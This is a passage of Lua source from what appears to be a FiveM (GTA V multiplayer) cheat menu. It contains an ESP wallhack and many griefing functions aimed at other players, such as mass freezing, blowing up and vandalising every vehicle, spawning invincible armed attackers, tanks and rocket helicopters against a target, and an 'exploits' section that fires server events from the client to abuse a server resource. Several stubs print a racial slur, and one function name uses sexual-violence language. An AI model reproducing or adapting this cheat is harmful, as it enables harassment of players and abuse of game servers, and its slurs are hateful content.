					local wepname = GetWeaponNameFromHash(wephash)
					local vehname = "On Foot"..'~s~ |'
					if IsPedInAnyVehicle(GetPlayerPed(plist[i]), 0) then
						vehname = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(GetPlayerPed(plist[i])))))..'~s~ |'
					end
					if wepname == nil then wepname = "Unknown" end
					if visualsESPShowBox then
						DrawRect(x, y, 0.008, 0.01, 0, 0, 255, 255)
						DrawRect(x, y, 0.003, 0.005, 255, 0, 0, 255)
					end
					local espstring1 = ''
					local espstring2 = ''
					if visualsESPShowID then
						espstring1 = espstring1.."~s~ | ~w~ID: ~s~" .. GetPlayerServerId(plist[i])
					end
					if visualsESPShowName then
						espstring1 = espstring1.."~s~ | ~w~Name: ~s~" .. GetPlayerName(plist[i])
					end
					if visualsESPShowDistance then
						espstring1 = espstring1.."~s~ | ~w~Distance: ~s~" .. math.floor(distance)..'~s~ |'
					end
					if visualsESPShowWeapon then
						espstring2 = espstring2.."~s~ | ~w~Weapon: ~s~" .. wepname
					end
					if visualsESPShowVehicle then
						espstring2 = espstring2.."~s~ | ~w~Vehicle: ~s~" .. vehname
					end
					DrawTxt(espstring1, x - 0.055, y - 0.250, 0.0, 0.25, MainColor)
					DrawTxt(espstring2, x - 0.055, y - 0.225, 0.0, 0.25, MainColor)

					if visualsESPShowLine then
						local x1, y1, z1 = table.unpack(GetEntityCoords(PlayerPedId(-1)))
						local x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(i)))
						DrawLine(x1, y1, z1, x2, y2, z2, MainColor.r, MainColor.g, MainColor.b, 255)
					end
				end
			end
			Citizen.Wait(visualsESPRefreshRate)
		end
	end)

end

local testicleTrainHasLoaded = true
local testicleTrain = nil
local testicleTrainSpeed = 5.0
NertigelFunc.spawnRandomTrain = function()
	if testicleTrain then
		DeleteMissionTrain(testicleTrain)
		trainSpeed = 5.0
		print("Deleted train")
		testicleTrain = nil
		testicleTrainHasLoaded = false
	else
		local cablecar = GetHashKey("cablecar")
		local metrotrain = GetHashKey("metrotrain")
		local freight = GetHashKey("freight")
		local freightcar = GetHashKey("freightcar")
		local freightgrain = GetHashKey("freightgrain")
		local freightcont1 = GetHashKey("freightcont1")
		local freightcont2 = GetHashKey("freightcont2")
		local freighttrailer = GetHashKey("freighttrailer")

		RequestModel(cablecar)
		RequestModel(metrotrain)
		RequestModel(freight)
		RequestModel(freightcar)
		RequestModel(freightgrain)
		RequestModel(freightcont1)
		RequestModel(freightcont2)
		RequestModel(freighttrailer)

		while (not HasModelLoaded(cablecar)) do Wait(0) end
		while (not HasModelLoaded(metrotrain)) do Wait(0) end
		while (not HasModelLoaded(freight)) do Wait(0) end
		while (not HasModelLoaded(freightcar)) do Wait(0) end
		while (not HasModelLoaded(freightgrain)) do Wait(0) end
		while (not HasModelLoaded(freightcont1)) do Wait(0) end
		while (not HasModelLoaded(freightcont2)) do Wait(0) end
		while (not HasModelLoaded(freighttrailer)) do Wait(0) end

		local c = GetEntityCoords(PlayerPedId(), false)
		testicleTrain = CreateMissionTrain(24, c.x, c.y, c.z, 1)
		SetVehicleUndriveable(testicleTrain, false)
		TaskWarpPedIntoVehicle(PlayerPedId(), testicleTrain, -1)
		print("Spawned train")
		testicleTrainHasLoaded = true
	end

	if testicleTrainHasLoaded then
		if (GetVehiclePedIsIn(PlayerPedId(), false) == testicleTrain) then
			local message = "Train speed: ~b~" .. tostring(trainSpeed)
			print(message)

			if (GetGameTimer() >= timer) then
				SetTrainSpeed(testicleTrain, trainSpeed)
				timer = GetGameTimer() + 10
			end

			if (IsDisabledControlJustReleased(1, Keys["UP"])) then
				trainSpeed = trainSpeed + 0.1
				print('trainSpeed'..trainSpeed)
			elseif (IsDisabledControlJustReleased(1, Keys["DOWN"])) then
				if (trainSpeed - 0.1 >= 0.0) then
					trainSpeed = trainSpeed - 0.1
				end
				print('trainSpeed'..trainSpeed)
			end
		end
	end
end

--[[allPlayersOptions]]
NertigelFunc.aPO = {}

NertigelFunc.aPO.template = function()
	local plist = GetActivePlayers()
	for i = 0, #plist do
		if not allPlayersIncludeSelf and i == PlayerId() then i = i + 1 end
		--[[do shit here]]
	end
end

NertigelFunc.aPO.freezeAll = function()
	local plist = GetActivePlayers()
	for i = 0, #plist do
		if not allPlayersIncludeSelf and i == PlayerId() then i = i + 1 end
		
		ClearPedTasksImmediately(GetPlayerPed(i))
		ClearPedSecondaryTask(GetPlayerPed(i))
	end
end

NertigelFunc.aPO.disableDrivingCars = function()
	local plist = GetActivePlayers()
	for i = 0, #plist do
		if not allPlayersIncludeSelf and i == PlayerId() then i = i + 1 end
		
		if IsPedInAnyVehicle(GetPlayerPed(i), true) then
			ClearPedTasksImmediately(GetPlayerPed(i))
		end
	end
end

NertigelFunc.aPO.noisyVehicles = function()
	for k in EnumerateVehicles() do
		SetVehicleAlarmTimeLeft(k, 60)
	end
end

NertigelFunc.aPO.explodeCars = function()
	for vehicle in EnumerateVehicles() do
		if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) and (not GotTrailer or (GotTrailer and vehicle ~= TrailerHandle)) then
			RequestControlOnce(vehicle)
			NetworkExplodeVehicle(vehicle, true, true, false)
		end
	end
end

NertigelFunc.aPO.rapeVehicles = function()
	for enumeratedVs in EnumerateVehicles() do
		if not IsPedAPlayer(GetPedInVehicleSeat(enumeratedVs, -1)) then
			RequestControlOnce(enumeratedVs)
            SetEntityAsMissionEntity(enumeratedVs, false, false)
            StartVehicleAlarm(enumeratedVs)
            DetachVehicleWindscreen(enumeratedVs)
            SmashVehicleWindow(enumeratedVs, 0)
            SmashVehicleWindow(enumeratedVs, 1)
            SmashVehicleWindow(enumeratedVs, 2)
            SmashVehicleWindow(enumeratedVs, 3)
            SetVehicleTyreBurst(enumeratedVs, 0, true, 1000.0)
            SetVehicleTyreBurst(enumeratedVs, 1, true, 1000.0)
            SetVehicleTyreBurst(enumeratedVs, 2, true, 1000.0)
            SetVehicleTyreBurst(enumeratedVs, 3, true, 1000.0)
            SetVehicleTyreBurst(enumeratedVs, 4, true, 1000.0)
            SetVehicleTyreBurst(enumeratedVs, 5, true, 1000.0)
            SetVehicleTyreBurst(enumeratedVs, 4, true, 1000.0)
            SetVehicleTyreBurst(enumeratedVs, 7, true, 1000.0)
            SetVehicleDoorBroken(enumeratedVs, 0, true)
            SetVehicleDoorBroken(enumeratedVs, 1, true)
            SetVehicleDoorBroken(enumeratedVs, 2, true)
            SetVehicleDoorBroken(enumeratedVs, 3, true)
            SetVehicleDoorBroken(enumeratedVs, 4, true)
            SetVehicleDoorBroken(enumeratedVs, 5, true)
            SetVehicleDoorBroken(enumeratedVs, 6, true)
            SetVehicleDoorBroken(enumeratedVs, 7, true)
            SetVehicleLights(enumeratedVs, 1)
            SetVehicleLightsMode(enumeratedVs, 1)
            --[[SetVehicleNumberPlateTextIndex(enumeratedVs, 5)
            SetVehicleNumberPlateText(enumeratedVs, 'dopamine')]]
            SetVehicleDirtLevel(enumeratedVs, 10.0)
            SetVehicleModColor_1(enumeratedVs, 1)
            SetVehicleModColor_2(enumeratedVs, 1)
            SetVehicleCustomPrimaryColour(enumeratedVs, 255, 51, 255)
            SetVehicleCustomSecondaryColour(enumeratedVs, 255, 51, 255)
			SetVehicleBurnout(enumeratedVs, true)
			ForceVehicleEngineAudio(enumeratedVs, 'faggio')
			SetVehicleLightsMode(enumeratedVs, 1)
			SetVehicleHandlingFloat(enumeratedVs, "CHandlingData", "fDriveBiasFront", 0.9)
        end
    end
end

NertigelFunc.aPO.vehiclesIntoRamps = function()
	for vehicle in EnumerateVehicles() do
		local ramp = CreateObject(-145066854, 0, 0, 0, true, true, true)
		NetworkRequestControlOfEntity(vehicle)
		RequestControlOnce(vehicle)
		RequestControlOnce(ramp)
		if DoesEntityExist(vehicle) then
			AttachEntityToEntity(ramp, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
		end
		NetworkRequestControlOfEntity(ramp)
		SetEntityAsMissionEntity(ramp, true, true)
	end
end

NertigelFunc.aPO.beachFire = function()
	local plist = GetActivePlayers()
	for i = 0, #plist do
		if not allPlayersIncludeSelf and i == PlayerId() then i = i + 1 end
		NertigelFunc.sPO.beachFire(GetPlayerPed(plist[i]))
	end
end

NertigelFunc.aPO.gasPump = function()
	local plist = GetActivePlayers()
	for i = 0, #plist do
		if not allPlayersIncludeSelf and i == PlayerId() then i = i + 1 end
		NertigelFunc.sPO.gasPump(GetPlayerPed(plist[i]))
	end
end

NertigelFunc.aPO.clonePeds = function()
	local plist = GetActivePlayers()
	for i = 0, #plist do
		if not allPlayersIncludeSelf and i == PlayerId() then i = i + 1 end
		local Handle = GetPlayerPedScriptIndex(GetPlayerPed(i))
		--[[local Handle = GetPlayerPedScriptIndex(plist[i])]]
		ClonePed(Handle, 1, 1, 1)
	end
end

NertigelFunc.aPO.spawnTrollProp = function(prop)
	local plist = GetActivePlayers()
	for i = 0, #plist do
		NertigelFunc.sPO.spawnTrollProp(GetPlayerPed(i), prop)
	end
end

--[[selectedPlayerOptions]]
NertigelFunc.sPO = {}

NertigelFunc.sPO.beachFire = function(target)
	local beach_fire = GetHashKey("prop_beach_fire")
	RequestModel(beach_fire)
	Citizen.CreateThread(function()
		local timeout = 0
		while not HasModelLoaded(beach_fire) do
			timeout = timeout + 100
			Citizen.Wait(100)
			if timeout > 5000 then
				Dopamine.PushNotification('Could not load model!', 5000)
				break
			end
		end
		local object = CreateObject(beach_fire, 0, 0, 0, true, true, false)
		AttachEntityToEntity(object, target, GetPedBoneIndex(target, SKEL_Spine_Root), 0.0, 0.0, 0.0, 0.0, 90.0, 0, false, false, false, false, 2, true)
		SetModelAsNoLongerNeeded(beach_fire)
	end)
end

NertigelFunc.sPO.gasPump = function(target)
	local gasPumpModels = { 
		-2007231801, 1339433404, 
		1694452750, 1933174915, 
		-462817101, -469694731, 
		-164877493
	 }
	local playerPos = GetEntityCoords(target, false)
	for i = 1, #gasPumpModels do
		obj = CreateObject(gasPumpModels[i], playerPos.x, playerPos.y, playerPos.z, true, true, true)
		RequestControlOnce(obj)
		if DoesEntityExist(obj) then
			AttachEntityToEntity(obj, target, GetPedBoneIndex(target, SKEL_Spine_Root), 0.0, 0.0, 0.0, 0.0, 90.0, 0, false, false, false, false, 2, true)
		end
	end
end

NertigelFunc.sPO.spectatePlayer = function(target)
	isSpectatingTarget = not isSpectatingTarget
	local targetPed = GetPlayerPed(target)
	if isSpectatingTarget then
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))
        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(true, targetPed)
		RequestCollisionAtCoord(GetEntityCoords(targetPed))
		NetworkSetInSpectatorMode(true, targetPed)
		NertigelFunc.Game.Subtitle("Started spectating ~b~" .. GetPlayerName(target))
	else
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))
        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(false, targetPed)
		NertigelFunc.Game.Subtitle("Stopped spectating ~b~" .. GetPlayerName(target))
	end
end

NertigelFunc.sPO.teleportToPlayer = function(target)
	SetEntityCoords(PlayerPedId(), GetEntityCoords(GetPlayerPed(target)))
end

function SpawnVehicleToPlayer(modelName, playerIdx)
	if modelName and IsModelValid(modelName) and IsModelAVehicle(modelName) then
		RequestModel(modelName)
		while not HasModelLoaded(modelName) do Citizen.Wait(0) end
		local model = (type(modelName) == 'number' and modelName or GetHashKey(modelName))
		local playerPed = GetPlayerPed(playerIdx)
		local SpawnedVehicle = CreateVehicle(model, GetEntityCoords(playerPed), GetEntityHeading(playerPed), true, true)
		local SpawnedVehicleIdx = NetworkGetNetworkIdFromEntity(SpawnedVehicle)
		SetNetworkIdCanMigrate(SpawnedVehicleIdx, true)
		SetEntityAsMissionEntity(SpawnedVehicle, true, false)
		SetVehicleHasBeenOwnedByPlayer(SpawnedVehicle, true)
		SetVehicleNeedsToBeHotwired(SpawnedVehicle, false)
		SetModelAsNoLongerNeeded(model)

		SetPedIntoVehicle(playerPed, SpawnedVehicle, -1)
		SetVehicleEngineOn(SpawnedVehicle, true, false, false)
		SetVehRadioStation(SpawnedVehicle, 'OFF')
		return SpawnedVehicle
	else
		FiveM.Notify("Invalid Vehicle Model!", NotificationType.Error)
		return nil
	end
end

NertigelFunc.sPO.cloneVehicle = function(target)
	local selectedPlayerVehicle = nil
	if IsPedInAnyVehicle(GetPlayerPed(target)) then selectedPlayerVehicle = GetVehiclePedIsIn(GetPlayerPed(target), false)
	else selectedPlayerVehicle = GetVehiclePedIsIn(GetPlayerPed(target), true) end

	if DoesEntityExist(selectedPlayerVehicle) then
		local vehicleModel = GetEntityModel(selectedPlayerVehicle)
		local spawnedVehicle = SpawnVehicleToPlayer(vehicleModel, PlayerId())

		local vehicleProperties = NertigelFunc.Game.GetVehicleProperties(selectedPlayerVehicle)
		vehicleProperties.plate = nil

		NertigelFunc.Game.SetVehicleProperties(spawnedVehicle, vehicleProperties)

		SetVehicleEngineOn(spawnedVehicle, true, false, false)
		SetVehRadioStation(spawnedVehicle, 'OFF')
	end
end

NertigelFunc.sPO.clonePedOutfit = function(me, ped)
	
	hat = GetPedPropIndex(ped, 0)
	hat_texture = GetPedPropTextureIndex(ped, 0)
	
	glasses = GetPedPropIndex(ped, 1)
	glasses_texture = GetPedPropTextureIndex(ped, 1)
	
	ear = GetPedPropIndex(ped, 2)
	ear_texture = GetPedPropTextureIndex(ped, 2)
	
	watch = GetPedPropIndex(ped, 6)
	watch_texture = GetPedPropTextureIndex(ped, 6)
	
	wrist = GetPedPropIndex(ped, 7)
	wrist_texture = GetPedPropTextureIndex(ped, 7)
	
	head_drawable = GetPedDrawableVariation(ped, 0)
	head_palette = GetPedPaletteVariation(ped, 0)
	head_texture = GetPedTextureVariation(ped, 0)
	
	beard_drawable = GetPedDrawableVariation(ped, 1)
	beard_palette = GetPedPaletteVariation(ped, 1)
	beard_texture = GetPedTextureVariation(ped, 1)
	
	hair_drawable = GetPedDrawableVariation(ped, 2)
	hair_palette = GetPedPaletteVariation(ped, 2)
	hair_texture = GetPedTextureVariation(ped, 2)
	
	torso_drawable = GetPedDrawableVariation(ped, 3)
	torso_palette = GetPedPaletteVariation(ped, 3)
	torso_texture = GetPedTextureVariation(ped, 3)
	
	legs_drawable = GetPedDrawableVariation(ped, 4)
	legs_palette = GetPedPaletteVariation(ped, 4)
	legs_texture = GetPedTextureVariation(ped, 4)
	
	hands_drawable = GetPedDrawableVariation(ped, 5)
	hands_palette = GetPedPaletteVariation(ped, 5)
	hands_texture = GetPedTextureVariation(ped, 5)
	
	foot_drawable = GetPedDrawableVariation(ped, 6)
	foot_palette = GetPedPaletteVariation(ped, 6)
	foot_texture = GetPedTextureVariation(ped, 6)
	
	acc1_drawable = GetPedDrawableVariation(ped, 7)
	acc1_palette = GetPedPaletteVariation(ped, 7)
	acc1_texture = GetPedTextureVariation(ped, 7)
	
	acc2_drawable = GetPedDrawableVariation(ped, 8)
	acc2_palette = GetPedPaletteVariation(ped, 8)
	acc2_texture = GetPedTextureVariation(ped, 8)
	
	acc3_drawable = GetPedDrawableVariation(ped, 9)
	acc3_palette = GetPedPaletteVariation(ped, 9)
	acc3_texture = GetPedTextureVariation(ped, 9)
	
	mask_drawable = GetPedDrawableVariation(ped, 10)
	mask_palette = GetPedPaletteVariation(ped, 10)
	mask_texture = GetPedTextureVariation(ped, 10)
	
	aux_drawable = GetPedDrawableVariation(ped, 11)
	aux_palette = GetPedPaletteVariation(ped, 11) 	
	aux_texture = GetPedTextureVariation(ped, 11)

	SetPedPropIndex(me, 0, hat, hat_texture, 1)
	SetPedPropIndex(me, 1, glasses, glasses_texture, 1)
	SetPedPropIndex(me, 2, ear, ear_texture, 1)
	SetPedPropIndex(me, 6, watch, watch_texture, 1)
	SetPedPropIndex(me, 7, wrist, wrist_texture, 1)
	
	SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette)
	SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette)
	SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette)
	SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette)
	SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette)
	SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette)
	SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette)
	SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette)
	SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette)
	SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette)
	SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette)
	SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette)
end

NertigelFunc.sPO.spawnEnemies = function(target, model)
	local wep = "WEAPON_ASSAULTRIFLE"
	for i = 0, 5 do
		local coords = GetEntityCoords(target)
		RequestModel(GetHashKey(model))
		Citizen.Wait(50)
		if HasModelLoaded(GetHashKey(model)) then
			local ped = CreatePed(21, GetHashKey(model),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(model),coords.x - i, coords.y + i, coords.z, 0, true, true)
			NetworkRegisterEntityAsNetworked(ped)
			Citizen.CreateThread(function()
				if DoesEntityExist(ped) and not IsEntityDead(target) then
					local netped = PedToNet(ped)
					NetworkSetNetworkIdDynamic(netped, false)
					SetNetworkIdCanMigrate(netped, true)
					SetNetworkIdExistsOnAllMachines(netped, true)
					Citizen.Wait(100)
					NetToPed(netped)
					GiveWeaponToPed(ped, GetHashKey(wep), 9999, 1, 1)
					SetEntityInvincible(ped, true)
					SetPedCanSwitchWeapon(ped, true)
					TaskCombatPed(ped, target, 0,16)
				elseif IsEntityDead(target) then
					TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
				else
					Citizen.Wait(0)
				end
			end)
		end
	end
end

NertigelFunc.sPO.spawnHeliEnemies = function(target)
	local x, y, z = table.unpack(GetEntityCoords(target))
	local flacko_veri_cool = 'buzzard'
	local nertigel_flighter = 'ig_claypain'
	RequestModelSync(flacko_veri_cool)
	RequestModelSync(nertigel_flighter)
	RequestModel(flacko_veri_cool)
	RequestModel(nertigel_flighter)
	Citizen.CreateThread(function()
		local timeout = 0
		while not HasModelLoaded(nertigel_flighter) do
			timeout = timeout + 100
			Citizen.Wait(100)
			if timeout > 5000 then
				Dopamine.PushNotification('Could not load model!', 5000)
				break
			end
		end
		while not HasModelLoaded(flacko_veri_cool) do
			timeout = timeout + 100
			Citizen.Wait(100)
			if timeout > 5000 then
				Dopamine.PushNotification('Could not load model!', 5000)
				break
			end
		end
		local flacko_dream_heli = CreateVehicle(GetHashKey(flacko_veri_cool),x,y,z + 100, GetEntityHeading(target), true, true)
		local newDriver = CreatePedInsideVehicle(flacko_dream_heli, 4, nertigel_flighter, -1, true, false)
		SetHeliBladesFullSpeed(flacko_dream_heli)

		SetCurrentPedVehicleWeapon(newDriver, GetHashKey("VEHICLE_WEAPON_PLANE_ROCKET"))
		SetVehicleShootAtTarget(newDriver, target, x, y, z)

		local netped = PedToNet(newDriver)
		NetworkSetNetworkIdDynamic(netped, false)
		SetNetworkIdCanMigrate(netped, true)
		SetNetworkIdExistsOnAllMachines(netped, true)
		Citizen.Wait(30)
		NetToPed(netped)
		SetEntityInvincible(netped, true)
		
		SetPedCanSwitchWeapon(newDriver, true)
		TaskCombatPed(newDriver, target, 0, 16)
		
		local model = 'a_m_y_skater_01'
		local wep = "WEAPON_ASSAULTRIFLE"
		for i = 1, 3 do
			local coords = GetEntityCoords(target)
			RequestModel(GetHashKey(model))
			Citizen.Wait(50)
			if HasModelLoaded(GetHashKey(model)) then
				local ped = CreatePedInsideVehicle(flacko_dream_heli, 4, nertigel_flighter, i, true, false)
				NetworkRegisterEntityAsNetworked(ped)
				Citizen.CreateThread(function()
					if DoesEntityExist(ped) and not IsEntityDead(target) then
						local netped = PedToNet(ped)
						NetworkSetNetworkIdDynamic(netped, false)
						SetNetworkIdCanMigrate(netped, true)
						SetNetworkIdExistsOnAllMachines(netped, true)
						Citizen.Wait(100)
						NetToPed(netped)
						GiveWeaponToPed(ped, GetHashKey(wep), 9999, 1, 1)
						SetEntityInvincible(ped, true)
						SetPedCanSwitchWeapon(ped, true)
						TaskCombatPed(ped, target, 0,16)
					else
						Citizen.Wait(0)
					end
				end)
			end
		end
	end)
end

NertigelFunc.sPO.spawnTankEnemy = function(target)
	local theTank = 'rhino'
	RequestModel(theTank)
	while not HasModelLoaded(theTank) do
		Citizen.Wait(50)
	end
	local lVehicle = GetVehiclePedIsIn(target, false)
	local x,y,z = table.unpack(GetEntityCoords(target))
	local tank = CreateVehicle(GetHashKey(theTank), x + 20,y + 20,z + 5,GetEntityCoords(target),true,false)
	RequestControlOnce(tank)
	local pPed = 's_m_y_swat_01'
	RequestModel(pPed)
	while not HasModelLoaded(pPed) do
		RequestModel(pPed)
		Citizen.Wait(50)
	end
	local NerdTigel = CreatePedInsideVehicle(tank, 4, GetEntityModel(PlayerPedId()), -1, true, false)
	RequestControlOnce(NerdTigel)
	SetDriverAbility(NerdTigel, 10.0)
	SetDriverAggressiveness(NerdTigel, 10.0)
	TaskCombatPed(NerdTigel, target, 0, 16)
end

NertigelFunc.sPO.giveAllWeapons = function(target)
	for i = 1, #weaponsArrayeet do
		GiveWeaponToPed(target, GetHashKey(weaponsArrayeet[i]), 250, false, false)
	end
end

NertigelFunc.sPO.spawnPickupsOn = function(target)
	CreatePickup(GetHashKey("PICKUP_WEAPON_COMPACTLAUNCHER"), GetEntityCoords(target))
	CreatePickup(GetHashKey("PICKUP_WEAPON_RAYMINIGUN"), GetEntityCoords(target))
	CreatePickup(GetHashKey("PICKUP_WEAPON_MINIGUN"), GetEntityCoords(target))
	CreatePickup(GetHashKey("PICKUP_WEAPON_RAYPISTOL"), GetEntityCoords(target))
end

NertigelFunc.sPO.ramVehicle = function(target, m_vehicle)
	local model = GetHashKey(m_vehicle)
	RequestModel(model)
	while not HasModelLoaded(model) do
		Citizen.Wait(0)
	end
	local offset = GetOffsetFromEntityInWorldCoords(target, 0, -10.0, 0)
	if HasModelLoaded(model) then
		local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(target), true, true)
		SetVehicleForwardSpeed(veh, 120.0)
	end
end

NertigelFunc.sPO.spawnTrollProp = function(target, prop)
	local ec = GetHashKey(prop)
	local ed = CreateObject(ec, 0, 0, 0, true, true, true)
	if prop == 'prop_cs_dildo_01' then
		AttachEntityToEntity(ed, target, GetPedBoneIndex(target, 24818), -0.425, 0.185, 0.0, 270.0, 0.0, -25.0, true, true, false, true, 1, true)
	else
		AttachEntityToEntity(ed, target, GetPedBoneIndex(target, 57005), 0.4, 0.0, 0.0, 0.0, 270.0, 60.0, true, true, false, true, 1, true)
	end
end

--[[
	Some nice exploits yes?
]]

NertigelFunc.exploits = {}

NertigelFunc.exploits.gcphoneTwitter = function()
	print('deleted due to u being a nigger')
end

NertigelFunc.exploits.esx_license = function()
	print('deleted due to u being a nigger')
end

NertigelFunc.exploits.esx_kashacters = function()
	print('deleted due to u being a nigger')
end

NertigelFunc.exploits.interactSound = function()
	if NertigelFunc.doesResourceExist('interactSound') or 
	NertigelFunc.doesResourceExist('InteractSound') or 
	NertigelFunc.doesResourceExist('interact-sound') then
		TriggerCustomEvent(true, 'InteractSound_SV:PlayOnAll', 'demo', 10.0)
		TriggerCustomEvent(true, 'InteractSound_SV:PlayWithinDistance', 500.0, 'demo', 10.0)
	else Dopamine.PushNotification("Resource was not found!", 5000) end
end

NertigelFunc.exploits.phoneSpam = function()
	print('deleted due to u being a nigger')
end

--[[
	Math functions here instead of using frameworks from servers.
]]

NertigelFunc.Math = {}

NertigelFunc.Math.Round = function(value, numDecimalPlaces)
	if numDecimalPlaces then
		local power = 10^numDecimalPlaces
		return math.floor((value * power) + 0.5) / (power)
	else
		return math.floor(value + 0.5)
	end
end

NertigelFunc.Math.GroupDigits = function(value)
	local left,num,right = string.match(value,'^([^%d]*%d)(%d*)(.-)$')

	return left..(num:reverse():gsub('(%d%d%d)','%1' .. _U('locale_digit_grouping_symbol')):reverse())..right
end

NertigelFunc.Math.Trim = function(value)
	if value then
		return (string.gsub(value, "^%s*(.-)%s*$", "%1"))
	else
		return nil
	end
end

--[[
	Game functions(text, math, etc).
]]

NertigelFunc.Game = {}

NertigelFunc.Game.Subtitle = function(message, duration, drawImmediately)
    if duration == nil then 
    	duration = 2500 
    end
    if drawImmediately == nil then 
    	drawImmediately = true
     end
    ClearPrints()
    SetTextEntry_2("STRING")
    for i = 1, message:len(), 99 do
        AddTextComponentString(string.sub(message, i, i + 99))
    end
    DrawSubtitleTimed(duration, drawImmediately)
end

NertigelFunc.Game.GetVehicles = function()
	local vehicles = {}

	for vehicle in EnumerateVehicles() do
		table.insert(vehicles, vehicle)
	end

	return vehicles
end

NertigelFunc.Game.GetVehiclesInArea = function(coords, area)
	local vehicles       = NertigelFunc.Game.GetVehicles()
	local vehiclesInArea = {}

	for i = 1, #vehicles, 1 do
		local vehicleCoords = GetEntityCoords(vehicles[i])
		local distance      = GetDistanceBetweenCoords(vehicleCoords, coords.x, coords.y, coords.z, true)

		if distance <= area then
			table.insert(vehiclesInArea, vehicles[i])
		end
	end

	return vehiclesInArea
end

NertigelFunc.Game.KeyboardInput = function(TextEntry, ExampleText, MaxStringLength)
	AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
	DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
	blockinput = true

	while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
		Citizen.Wait(0)
	end

	if UpdateOnscreenKeyboard() ~= 2 then
		local result = GetOnscreenKeyboardResult()
		Citizen.Wait(500)
		blockinput = false
		return result
	else
		Citizen.Wait(500)
		blockinput = false
		return nil
	end
end

NertigelFunc.Game.driftSmoke = function(base, sub, car, dens, size)
    all_part = {}
    
    for i = 0,dens do
        UseParticleFxAssetNextCall(base)
        W1 = StartParticleFxLoopedOnEntityBone(sub, car, 0.05, 0, 0, 0, 0, 0, GetEntityBoneIndexByName(car, "wheel_lr"), size, 0, 0, 0)

        UseParticleFxAssetNextCall(base)
        W2 = StartParticleFxLoopedOnEntityBone(sub, car, 0.05, 0, 0, 0, 0, 0, GetEntityBoneIndexByName(car, "wheel_rr"), size, 0, 0, 0)

        table.insert(all_part, 1, W1)
        table.insert(all_part, 2, W2)
    end
    
    Citizen.Wait(1000)
    
    for _,W1 in pairs(all_part) do
        StopParticleFxLooped(W1, true)
    end
end

NertigelFunc.Game.vehicleAngle = function(veh)
    if not veh then return false end
    local vx,vy,vz = table.unpack(GetEntityVelocity(veh))
    local modV = math.sqrt(vx*vx + vy*vy)
    
    
    local rx,ry,rz = table.unpack(GetEntityRotation(veh,0))
    local sn,cs = -math.sin(math.rad(rz)), math.cos(math.rad(rz))
    
    if GetEntitySpeed(veh)* 3.6 < 5 or GetVehicleCurrentGear(veh) == 0 then return 0,modV end --[[speed over 30 km/h]]
    
    local cosX = (sn*vx + cs*vy)/modV
    if cosX > 0.966 or cosX < 0 then return 0,modV end
    return math.deg(math.acos(cosX))*0.5, modV
end

NertigelFunc.Game.GetVehicleProperties = function(vehicle)
	if DoesEntityExist(vehicle) then
		local colorPrimary, colorSecondary = GetVehicleColours(vehicle)
		local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
		local extras = {}

		for id=0, 12 do
			if DoesExtraExist(vehicle, id) then
				local state = IsVehicleExtraTurnedOn(vehicle, id) == 1
				extras[tostring(id)] = state
			end
		end

		return {
			model             = GetEntityModel(vehicle),

			plate             = NertigelFunc.Math.Trim(GetVehicleNumberPlateText(vehicle)),
			plateIndex        = GetVehicleNumberPlateTextIndex(vehicle),

			bodyHealth        = NertigelFunc.Math.Round(GetVehicleBodyHealth(vehicle), 1),
			engineHealth      = NertigelFunc.Math.Round(GetVehicleEngineHealth(vehicle), 1),

			fuelLevel         = NertigelFunc.Math.Round(GetVehicleFuelLevel(vehicle), 1),
			dirtLevel         = NertigelFunc.Math.Round(GetVehicleDirtLevel(vehicle), 1),
			color1            = colorPrimary,
			color2            = colorSecondary,

			pearlescentColor  = pearlescentColor,
			wheelColor        = wheelColor,

			wheels            = GetVehicleWheelType(vehicle),
			windowTint        = GetVehicleWindowTint(vehicle),
			xenonColor        = GetVehicleXenonLightsColour(vehicle),

			neonEnabled       = {
				IsVehicleNeonLightEnabled(vehicle, 0),
				IsVehicleNeonLightEnabled(vehicle, 1),
				IsVehicleNeonLightEnabled(vehicle, 2),
				IsVehicleNeonLightEnabled(vehicle, 3)
			},

			neonColor         = table.pack(GetVehicleNeonLightsColour(vehicle)),
			extras            = extras,
			tyreSmokeColor    = table.pack(GetVehicleTyreSmokeColor(vehicle)),

			modSpoilers       = GetVehicleMod(vehicle, 0),
			modFrontBumper    = GetVehicleMod(vehicle, 1),
			modRearBumper     = GetVehicleMod(vehicle, 2),
			modSideSkirt      = GetVehicleMod(vehicle, 3),
			modExhaust        = GetVehicleMod(vehicle, 4),
			modFrame          = GetVehicleMod(vehicle, 5),
			modGrille         = GetVehicleMod(vehicle, 6),
			modHood           = GetVehicleMod(vehicle, 7),
			modFender         = GetVehicleMod(vehicle, 8),
			modRightFender    = GetVehicleMod(vehicle, 9),
			modRoof           = GetVehicleMod(vehicle, 10),

			modEngine         = GetVehicleMod(vehicle, 11),
			modBrakes         = GetVehicleMod(vehicle, 12),
